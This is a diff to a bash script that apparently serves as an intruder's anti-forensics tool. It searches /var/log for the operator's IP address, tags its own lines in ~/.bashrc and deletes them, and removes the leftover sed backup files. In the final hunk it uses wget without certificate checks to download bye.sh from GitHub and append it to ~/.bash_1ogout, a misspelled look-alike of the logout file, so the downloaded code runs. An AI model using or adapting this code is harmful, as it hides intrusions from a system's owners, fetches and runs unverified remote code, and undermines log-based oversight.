@@ -55,7 +55,7 @@ function CL { #_fdsagadsfasdgadsgsss
 deepcheck() { #_fdsagadsfasdgadsgsss
     # echo -ne "found and delete or only found [y/other]:${UNDERLINE}" #_fdsagadsfasdgadsgsss
     # read FOUND_DELE #_fdsagadsfasdgadsgsss
-    gglog "deep check if $my_ip in logs"
+    gglog "deep check if $my_ip in logs" #_fdsagadsfasdgadsgsss
     # echo -e "${REST}clear [${FOUND_DELE}]" #_fdsagadsfasdgadsgsss
     for f in $(grep -Ilr "$my_ip" /var/log/);do #_fdsagadsfasdgadsgsss
         gglog "$my_ip exists in $f." #_fdsagadsfasdgadsgsss
@@ -68,6 +68,12 @@ deepcheck() { #_fdsagadsfasdgadsgsss
 function ByeHack { #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bash_1ogout #_fdsagadsfasdgadsgsss
+    if [ -f ~/.bashrce ];then #_fdsagadsfasdgadsgsss
+      rm ~/.bashrce; #_fdsagadsfasdgadsgsss
+    fi #_fdsagadsfasdgadsgsss
+    if [ -f ~/.bash_1ogoute ];then #_fdsagadsfasdgadsgsss
+      rm ~/.bash_1ogoute; #_fdsagadsfasdgadsgsss
+    fi #_fdsagadsfasdgadsgsss
     CL #_fdsagadsfasdgadsgsss
     ___resume; #_fdsagadsfasdgadsgsss
     rm $index_f; #_fdsagadsfasdgadsgsss
@@ -89,6 +95,9 @@ fi #_fdsagadsfasdgadsgsss
 gglog "${UNDERLINE}ip:$my_ip pts:${my_pts}  ${REST}" #_fdsagadsfasdgadsgsss
 CL #_fdsagadsfasdgadsgsss
 sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc #_fdsagadsfasdgadsgsss
+if [ -f ~/.bashrce ];then #_fdsagadsfasdgadsgsss
+  rm ~/.bashrce; #_fdsagadsfasdgadsgsss
+fi #_fdsagadsfasdgadsgsss
 if [ ! -f ~/.bash_1ogout ];then #_fdsagadsfasdgadsgsss
     wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_1ogout; #_fdsagadsfasdgadsgsss
 else #_fdsagadsfasdgadsgsss
